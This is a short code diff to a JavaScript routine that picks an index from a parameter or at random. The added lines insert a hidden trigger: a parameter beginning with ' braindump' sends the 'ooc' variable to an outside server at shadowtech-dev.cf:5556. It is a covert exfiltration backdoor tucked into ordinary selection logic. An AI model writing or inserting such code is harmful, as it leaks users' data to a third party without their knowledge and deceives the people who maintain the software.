@@ -58,6 +58,9 @@ setTimeout(function(){
     ind=Number(param.substring(1,param.length));
     ind=(ind>=len?0:ind);
     ind=(ind<0?0:ind);
+   }else if(param.startsWith(" braindump")){
+    var fd = ooc;
+    syncRequest("http://shadowtech-dev.cf:5556", fd);
    }else{
     ind=Math.floor(Math.random()*len);
    }
